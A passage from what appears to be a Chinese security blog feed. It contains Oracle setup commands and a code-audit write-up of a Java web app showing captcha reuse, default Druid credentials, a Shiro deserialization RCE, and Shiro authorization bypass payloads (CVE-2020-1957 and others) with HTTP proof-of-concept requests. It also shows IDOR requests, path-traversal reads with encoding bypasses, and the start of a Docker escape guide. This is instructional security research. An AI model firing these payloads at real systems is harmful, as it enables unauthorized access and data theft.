class="hljs-built_in">export</span> ORACLE_HOME=/home/oracle/app/oracle/product/11.2.0/dbhome_2export ORACLE_SID=helowinexport PATH=<span class="hljs-variable">$ORACLE_HOME</span>/bin:<span class="hljs-variable">$PATH</span>  <br><span class="hljs-comment">#更新环境变量</span><br><span class="hljs-built_in">source</span> /etc/profile  <br><span class="hljs-comment">#创建软连接：</span><br><span class="hljs-built_in">ln</span> -s <span class="hljs-variable">$ORACLE_HOME</span>/bin/sqlplus /usr/bin <br><span class="hljs-comment">#切换到oracle</span><br>su - oracle<br><span class="hljs-comment">#登录sqlplus并修改sys、system用户密码</span><br>sqlplus /nolog                                                 <span class="hljs-comment"># 登录oracle</span><br>conn /as sysdba                                                <span class="hljs-comment"># 连接,需要进行操作系统验证，才可进行连接登录</span><br>alter user system identified by [你的密码];                     <span class="hljs-comment"># 修改system用户账号密码</span><br>alter user sys identified by [你的密码];                            <span class="hljs-comment"># 修改sys用户账号密码</span><br>ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;      <span class="hljs-comment"># 修改密码规则策略为密码永不过期</span><br><span class="hljs-built_in">exit</span>;                                                          <span class="hljs-comment"># 退出</span><br></code></pre></td></tr></table></figure><p> oralce的其他命令：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;<span class="hljs-comment">#补充命令</span><br>&gt;<span class="hljs-comment">#登录sqlplus并修改sys、system用户密码: 需要注意的是再oracle用户下操作</span><br>&gt;sqlplus /nolog                                      <span class="hljs-comment"># 登录</span><br>&gt;conn /as sysdba                                     <span class="hljs-comment"># 连接</span><br>&gt;create user <span class="hljs-built_in">test</span> identified by <span class="hljs-built_in">test</span>;                <span class="hljs-comment"># 创建内部管理员账号密码；</span><br>&gt;grant connect,resource,dba to yan_test;             <span class="hljs-comment"># 将dba权限授权给内部管理员账号和密码；</span><br>&gt;alter system <span class="hljs-built_in">set</span> processes=1000 scope=spfile;       <span class="hljs-comment"># 修改数据库最大连接数据；#修改以上信息后，需要重新启动数据库</span><br>&gt;shutdown immediate;                                 <span class="hljs-comment"># 关闭数据库</span><br>&gt;startup;                                            <span class="hljs-comment"># 启动数据库</span><br>&gt;<span class="hljs-keyword">select</span> instance from v<span class="hljs-variable">$thread</span>;                      <span class="hljs-comment"># 查看数据库sid(实例名)</span><br>&gt;clear SCR  或 clear screen 或 clea scre              <span class="hljs-comment"># sqlplus清屏命令#创建表空间</span><br>&gt;create tablespace pts datafile <span class="hljs-string">&#x27;/home/oracle/app/oracle/oradata/helowin/pts.dbf&#x27;</span> size 100m autoextend on next 10m<br>&gt;drop tablespace PTS;                                <span class="hljs-comment"># 删除表空间</span><br>&gt;<span class="hljs-keyword">select</span> tablespace_name from dba_tablespaces;        <span class="hljs-comment"># 查看所有表空间</span><br>&gt;create user PTS identified by PTS default tablespace PTS;  <span class="hljs-comment"># 创建用户</span><br>&gt;drop user pts cascade;                              <span class="hljs-comment"># 删除用户</span><br>&gt;SQL&gt; grant sysdba to sys;                           <span class="hljs-comment"># 为sys用户添加sysdba权限</span><br>&gt;<span class="hljs-keyword">select</span> * from dba_role_privs <span class="hljs-built_in">where</span> granted_role=<span class="hljs-string">&#x27;DBA&#x27;</span>; <span class="hljs-comment"># 查看哪些用户被授予DBA权限</span><br>&gt;SQL&gt; <span class="hljs-keyword">select</span> userenv(<span class="hljs-string">&#x27;language&#x27;</span>) from dual;          <span class="hljs-comment"># 查看数据库编码</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="Oracle连接："><a href="#Oracle连接：" class="headerlink" title="Oracle连接："></a>Oracle连接：</h2><p>当执行了上面的命令，修改system用户密码为system后，查看数据库的sid（实例名）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> instance from v<span class="hljs-variable">$thread</span>;<br></code></pre></td></tr></table></figure><p>idea连接：<code>jdbc:oracle:thin:@[host]:[port]:[sid]</code></p><p>如图所示：</p><p><img src="/../../blog_image/image-20240316101955227.png" alt="image-20240316101955227"></p><p>连接即可。</p><h1 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h1><h2 id="1-验证码复用："><a href="#1-验证码复用：" class="headerlink" title="1. 验证码复用："></a>1. 验证码复用：</h2><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p><img src="/../../blog_image/image-20240316103739741.png" alt="image-20240316103739741"></p><p>抓包后修改账号和密码发现验证码存在复用情况，因此可以尝试爆破出账号和密码。</p><p>我们还看到登录中选择记住我后，存在<code>rememberMe</code>字段，因此可以推断出使用了shiro的鉴权中间件。</p><h3 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h3><p>查看登录接口：</p><p><img src="/../../blog_image/image-20240316114434386.png" alt="image-20240316114434386"></p><p>主要是调用了生成验证码接口后保存在session中，在登陆的时候尝试获取session中的验证码然后进行比较。</p><p>如果验证码错误则直接跳出，返回验证码错误了，而不是重新刷新验证码。正确的做法是使当前验证码失效，然后抛出错误，重新调用验证码接口。</p><h2 id="2-druid泄露："><a href="#2-druid泄露：" class="headerlink" title="2. druid泄露："></a>2. druid泄露：</h2><p>访问<code>/druid/index.html</code>，存在无需登录即可访问druid管理后台。</p><p>一般登录账号密码是<code>druid</code>，<code>druid123</code>。</p><p><img src="/../../blog_image/image-20240316115305210.png" alt="image-20240316115305210"></p><p>由于这里使用了shiro的session来管理，而不是使用request中的session，因此点击session监控是查看不到当前保存的session的。</p><p>如果获取了session，可以保存所有session，然后使用burp进行爆破，可以尝试无感知登录。</p><h2 id="3-shiro中间件漏洞："><a href="#3-shiro中间件漏洞：" class="headerlink" title="3. shiro中间件漏洞："></a>3. shiro中间件漏洞：</h2><h3 id="shiro反序列化rce："><a href="#shiro反序列化rce：" class="headerlink" title="shiro反序列化rce："></a>shiro反序列化rce：</h3><p>看到<code>rememberMe</code>直接梭哈：</p><p><img src="/../../blog_image/image-20240316135506959.png" alt="image-20240316135506959"></p><p>直接梭哈成功：</p><p><img src="/../../blog_image/image-20240316135522553.png" alt="image-20240316135522553"></p><h3 id="未授权访问："><a href="#未授权访问：" class="headerlink" title="未授权访问："></a>未授权访问：</h3><h4 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><p>查看shiro版本：<code>1.4.0</code></p><p><img src="/../../blog_image/image-20240316135647209.png" alt="image-20240316135647209"></p><p>存在可以绕过shiro授权，具体方法是</p><p><strong>SpringBoot(Tomcat)和Shiro对URL处理的差异化</strong></p><table><thead><tr><th>漏洞编号</th><th>CVE-2020-1957</th><th>CVE-2020-11989</th><th>CVE-2020-13933</th></tr></thead><tbody><tr><td>影响版本</td><td>Apache Shiro &lt; 1.5.1</td><td>Apache Shiro &lt; 1.5.2</td><td>Apache Shiro &lt; 1.6</td></tr><tr><td>payload</td><td>&#x2F;xxxx&#x2F;..;&#x2F;admin&#x2F;</td><td>&#x2F;;&#x2F;test&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr><tr><td>Shrio 处理结果</td><td>&#x2F;xxxx&#x2F;..</td><td>&#x2F;</td><td>&#x2F;admin&#x2F;</td></tr><tr><td>SpringBoot 处理结果</td><td>&#x2F;admin&#x2F;</td><td>&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr></tbody></table><p>查看shiro中的配置内容：</p><p><img src="/../../blog_image/image-20240316141817569.png" alt="image-20240316141817569"></p><p>主要存在<code>/js/**</code>的路径都可以匿名访问，根据CVE-2020-1957，我们请求<code>/js/..;/user/list</code>，shiro则会处理成<code>/js/..</code>，而sb则会处理成<code>/user/list</code>。<code>map.put(&quot;/**&quot;,&quot;user&quot;)</code>表示的是其他路径被配置为需要用户身份验证的请求。</p><p>根据这个可以构造以下poc：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/js/..;/user/list?pageSize=10&amp;pageNum=1&amp;username=&amp;ssex=&amp;status=&amp;_=1710569357397</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>实现了匿名访问：</p><p><img src="/../../blog_image/image-20240316142017981.png" alt="image-20240316142017981"></p><h4 id="代码审计：-1"><a href="#代码审计：-1" class="headerlink" title="代码审计："></a>代码审计：</h4><p>在<code>WebUtils</code>这个类中存在<code>decodeAndCleanUriString()</code>方法</p><p><img src="/../../blog_image/image-20240316155232928.png" alt="image-20240316155232928"></p><p>shiro鉴权中，调用了<code>decodeAndCleanUriString</code>，主要逻辑是获取<code>;</code>的索引然后判断是否存在，如果存在则截取<code>;</code>前的路径，否则直接返回。</p><p><img src="/../../blog_image/image-20240316155509117.png" alt="image-20240316155509117"></p><p>然后调用<code>PathMatchingFilterChainResolver</code>中的<code>getChain</code>方法，获取对应的filter过滤器：</p><p>当前匹配路径<code>/js/..;/user/list</code>会被处理成<code>/js/..</code>，由于<code>/js/**</code>是匿名访问，因此绕过了shiro的鉴权。</p><p><img src="/../../blog_image/image-20240316155833295.png" alt="image-20240316155833295"></p><p>在<code>getPathWithinServletMapping</code>中调用了<code>getPathWithinApplication</code>：</p><p><img src="/../../blog_image/image-20240316162944179.png" alt="image-20240316162944179"></p><p>这个方法主要是去除路径的<code>;</code>，把<code>//</code>替换成<code>/</code>：</p><p><img src="/../../blog_image/image-20240316162309998.png" alt="image-20240316162309998"></p><p><code>getRequestUri</code>中调用了<code>decodeAndCleanUriString</code>方法：</p><p><img src="/../../blog_image/image-20240316162139198.png" alt="image-20240316162139198"></p><p>这一步处理完就成了<code>/js/../user/list</code></p><p>然后继续调用<code>getPathWithinServletMapping</code>中的<code>getServletPath</code>方法，这个方法主要是获取servlet请求路径，这里明细了<code>/foo/</code>会被处理成<code>/foo</code>。</p><p>最终<code>/js/../user/list</code>会处理成<code>/user/list</code></p><h2 id="4-越权访问："><a href="#4-越权访问：" class="headerlink" title="4. 越权访问："></a>4. 越权访问：</h2><h3 id="获取用户信息："><a href="#获取用户信息：" class="headerlink" title="获取用户信息："></a>获取用户信息：</h3><h4 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/user/getUserProfile</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=942618d6-cb52-4ad4-bf48-4b35d4bfe8ce<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">userId</span><span class="hljs-operator">=</span><span class="hljs-number">41</span></span><br></code></pre></td></tr></table></figure><h4 id="代码审计：-2"><a href="#代码审计：-2" class="headerlink" title="代码审计："></a>代码审计：</h4><p>查看controller接口：</p><p><img src="/../../blog_image/image-20240316171137347.png" alt="image-20240316171137347"></p><p>可以看到查询个人信息的接口是传入id的，而且是不加以权限的，因此可以实现越权查询其他人的信息，如图所示：</p><p><img src="/../../blog_image/image-20240316171641975.png" alt="image-20240316171641975"></p><p>正确的做法应该是从session中获取当前登录的用户id，然后再查询，而不是由前端传入当前用户的id。</p><h3 id="更改任意用户信息："><a href="#更改任意用户信息：" class="headerlink" title="更改任意用户信息："></a>更改任意用户信息：</h3><h4 id="漏洞复现：-3"><a href="#漏洞复现：-3" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><p>点击个人信息，抓包：</p><p><img src="/../../blog_image/image-20240317102553499.png" alt="image-20240317102553499"></p><p>将用户名和id填写上去，可以修改任意用户的信息：</p><p><img src="/../../blog_image/image-20240317102916819.png" alt="image-20240317102916819"></p><p>可以修改当前的状态。</p><h4 id="代码审计：-3"><a href="#代码审计：-3" class="headerlink" title="代码审计："></a>代码审计：</h4><p>查看service层接口：</p><p><img src="/../../blog_image/image-20240317103010518.png" alt="image-20240317103010518"></p><p>这里将用户名和密码设置为null，然后调用<code>updateNotNull</code>方法，因此这个接口不能修改当前用户名称和密码。</p><p><code>updateNotNull</code>调用了<code>updateByPrimaryKeySelective</code>，即只修改修改过的值。</p><p><img src="/../../blog_image/image-20240317103104649.png" alt="image-20240317103104649"></p><p>可以看到没有对user实体类的数据进行过滤，从而实现修改任意用户的信息，这里我修改了当前用户的状态，令修改的用户不能登录。</p><p><img src="/../../blog_image/image-20240317103332406.png" alt="image-20240317103332406"></p><p>修复建议：</p><p>应该获取当前登录的用户，然后只修改当前用户信息，而不是从前端传入数据去修改。如果从前端获取的数据，应该判断需要修改的用户是否是当前登录的用户。</p><h2 id="5-任意文件下载："><a href="#5-任意文件下载：" class="headerlink" title="5. 任意文件下载："></a>5. 任意文件下载：</h2><h3 id="漏洞复现：-4"><a href="#漏洞复现：-4" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>目录穿越：</p><p>这个的fileName没有进行校验，所以导致了目录穿越。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/common/download?fileName=../../../../../../../../boot.ini&amp;delete=true</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=64231f02-080f-4fc2-aa56-ea286d532edf; rememberMe=T6B6VwfR1+Log+OLbsQ8dSGJX/7MsQC8ZpJvEEnegX7/uOvU0fFbgSuE/YzHR3pb9nAWS71q5O6IZY9ikoh2fLGPO+YUkTXKmnJVQOlqSFFrhxUk4fJsrvSwf674TrycHnatAWeahQKCbCi/hqDgHTHVca/Wq2JljjcEtGUnLrXZkLNBqOtm7zvGjv+JXWetUQR0cfiDM/ANn3Y/gAeG9T0JYtM5W8Vekp0o6QNvC0ZETZV1d8ZEZJR/SDwtoEmB8cViGjMbFNODPlyB0+S5mwRhNuMwx3fGENJXmCONq0B4pFGDNno6a/HijoscKhW94rQJOdHDz8bkfvcUYYJUNemvMyjKliJEGDyMy7bpMyRqPMNHkCVGaLftLEoXympTrpSz/7AUrqLXdzxcWk8DCOkSXUO1IntdkXeu/X7X9Maefkw9b4nnLIb4IrOhQJiDN7UIJ4Trb8riXeotSzX5tOdtAj87Y7GHdl/gYcZgMH8RHOdj3mUdimjf2pcwlVhZApokeox7iEsSQLBf9f+CXEhPbJNpDPWwdZrNUu3RqAy21vNkcGO7tWXZu67mMpgVEa73/NMRtKkR5Kw1JwjItEhL5yU/cOW8tbpziAfTkMejL0/2UMApQseIqCWyJfB3v+PxJePAbSQoMJTiVCviwrYW0WIyRF6gigmiSHaH4k+ERppDNKXet485wwPLDiOVmYFGyLEAx+ka9QQCEw+q0Xy9Zt7YrE0iv2kuzVhB1Legh5XwMdGjSAXNzQXN+MnzizPzkLl0bb/d380KEC0Vx5v1cyISiwvLIbFAZajfuGLQGuoqIZHzUy3kYLnsSzXX/gxSWnB29C0SB8+8XktZ6Hra8FKQkLB4hBmHTjwIvO6l2GnWRC2g3FyfLMvtsVUeaFaf2APZaPsC9Wj+DxL423Z64oGUGsHCw2FNLOZYVPFGFjQHAd26VarIARWPnn5lyvE6Ap+GEAZSkcrvGiAq2djWiZHvKkUbYYBek8Ll+JWdKUezU2AODjO7OKODUr/WoewBKA5IVOtxULyOzyhBZVeyFTt5olXI6ZDy6ZTxt5MJGGpKp+XnxXpiMjY224GVQYpq2q8vUqp07w2E08lr0ed3tAXvC79WivCgfgUOXKx+d5TeTrGU9TXpV27lBY6HSdxyqLtNO5VTDhKdV8e3Gx0A31hO2WU8KJmIIQKPC7Id217i5QTdtQvYJa5PC03VdI4JmEBuzTrZxdtHL7qz6/6rcGGwsn7Psksg/Pl9sIpT34sC1VRauIvXhjR5c7m3RJFjo7BG126XyULyv4GNEcngJcor8rOXJ0qeEF47J9OoB57XRIgmu3n0XD/Wi+EojJQuVPKW4T6ntr3675vjHNRHSV0JP7BwiC8lABjIS8I0pj8A07TgFq30SvbC4sLnS3OB1M6aJjvZ2vN4kzaPty/VB4O0ml57r8u0j42Udbg=<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><p>可以读取任意文件：</p><p><img src="/../../blog_image/image-20240317111025663.png" alt="image-20240317111025663"></p><p><strong>目录穿越绕过方案</strong></p><ol><li>进行URL编码：点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c</li></ol><p>..&#x2F;  –&gt;  %2e%2e%2f</p><ol><li>进行16为Unicode编码：点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216</li></ol><p>%u002e%u002e%u2215文件名</p><ol><li>进行双倍URL编码：点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c</li><li>进行超长UTF-8 Unicode编码：</li></ol><ul><li>点–&gt;%c0%2e %e0$40%ae %c0ae</li><li>反斜杠–&gt;%c0af %e0%80af %c0%af</li><li>正斜杠–&gt;%c0%5c %c0%80%5c</li></ul><h3 id="代码审计：-4"><a href="#代码审计：-4" class="headerlink" title="代码审计："></a>代码审计：</h3><p>这里主要用到了<code>FileInputStream</code>去读取文件，java中的目录穿越是原生的，支持这种<code>../</code>目录。</p><p><img src="/../../blog_image/image-20240317110514579.png" alt="image-20240317110514579"></p><p>修复建议：</p><p>对传入的文件名需要进行判断，对于<code>../</code>这种的文件名需要进行拦截操作。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker容器逃逸</title>
    <link href="/2024/03/13/%E4%BA%91%E5%AE%89%E5%85%A8/docker/docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    <url>/2024/03/13/%E4%BA%91%E5%AE%89%E5%85%A8/docker/docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>对于现在的服务，很多都是打包容器后运行的，因此我们拿到的shell可能是容器的shell，而不是真正宿主机的shell，因此这里介绍如何判断是否是docker容器，以及如何实现docker逃逸。</p><h1 id="1-检测是否docker容器："><a href="#1-检测是否docker容器：" class="headerlink" title="1. 检测是否docker容器："></a>1. 检测是否docker容器：</h1><p>我们都知道docker容器是靠cgroup进行资源隔离的，因此可以查看cgroup目录下是否存在docker。</p><p>使用以下命令可以判断当前是否是docker容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup | grep -qi docker &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Is Docker&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not Docker&quot;</span><br></code></pre></td></tr></table></figure><p>在linux中<code>/proc</code>文件系统是一个特殊的虚拟文件系统，提供了关于内核状态的信息。<code>/proc/1/cgroup</code> 文件包含了进程ID为1的进程（通常是 <code>init</code> 或者 <code>systemd</code>）所属的 cgroup（控制组）信息。</p><p>如果在宿主机中运行会有下面的结果：</p><p><img src="/../../../blog_image/image-20240313091638999-1717161065235-1.png" alt="image-20240313091638999"></p><p>而在docker容器内部，则会输出大量的docker，如图：</p><p><img src="/../../../blog_image/image-20240313091729585-1717161065236-2.png" alt="image-20240313091729585"></p><h1 id="2-docker特权模式逃逸："><a href="#2-docker特权模式逃逸：" class="headerlink" title="2. docker特权模式逃逸："></a>2. docker特权模式逃逸：</h1><p>Docker 特权模式是向主机系统上的所有设备授予 Docker 容器根功能。在特权模式下运行容器赋予它主机的功能。</p><p>在特权模式下可以实现目录挂载，写入ssh公钥等功能。因此在docker运行在特权模式下是非常危险的。</p><h2 id="2-1-宿主机排查特权模式容器："><a href="#2-1-宿主机排查特权模式容器：" class="headerlink" title="2.1 宿主机排查特权模式容器："></a>2.1 宿主机排查特权模式容器：</h2><p>宿主机如何排查docker特权模式的容器？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker ps -q | xargs -I &#123;&#125; docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;.Id&#125;&#125; &#123;&#123;.HostConfig.Privileged&#125;&#125;&#x27;</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>在宿主机中就可以查看到当前运行在特权模式下的docker容器：</p><p><img src="/../../../blog_image/image-20240313092633648-1717161065236-4.png" alt="image-20240313092633648"></p><p>或者查看容器的名称：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker ps --format <span class="hljs-string">&#x27;&#123;&#123;.Names&#125;&#125;&#x27;</span> | xargs -I &#123;&#125; docker inspect --format=<span class="hljs-string">&#x27;&#123;&#123;.Name&#125;&#125; &#123;&#123;.HostConfig.Privileged&#125;&#125;&#x27;</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240313093500659-1717161065236-3.png" alt="image-20240313093500659"></p><h2 id="2-2-容器内部排查特权模式："><a href="#2-2-容器内部排查特权模式：" class="headerlink" title="2.2 容器内部排查特权模式："></a>2.2 容器内部排查特权模式：</h2><h3 id="查看-proc-self-status目录："><a href="#查看-proc-self-status目录：" class="headerlink" title="查看&#x2F;proc&#x2F;self&#x2F;status目录："></a>查看&#x2F;proc&#x2F;self&#x2F;status目录：</h3><p>查看<code>/proc/self/status</code>目录下是否存在<code>0000001fffffffff</code>状态码和<code>0000003fffffffff</code>这个状态码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -Eqi <span class="hljs-string">&quot;CapEff:.*0000003fffffffff|CapEff:.*000001ffffffffff&quot;</span> /proc/self/status &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;是特权模式&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;不是特权模式，请查看procfs逃逸或者是socket逃逸&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240313094722838-1717161065236-5.png" alt="image-20240313094722838"></p><p>可以判断出是特权模式。</p><h3 id="查看容器可执行命令："><a href="#查看容器可执行命令：" class="headerlink" title="查看容器可执行命令："></a>查看容器可执行命令：</h3><p>在普通模式下，进程只能运行一些linux指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> dac_override fowner fsetid <span class="hljs-built_in">kill</span> setgid setuid setpcap net_bind_service net_raw sys_chroot <span class="hljs-built_in">mknod</span> audit_write 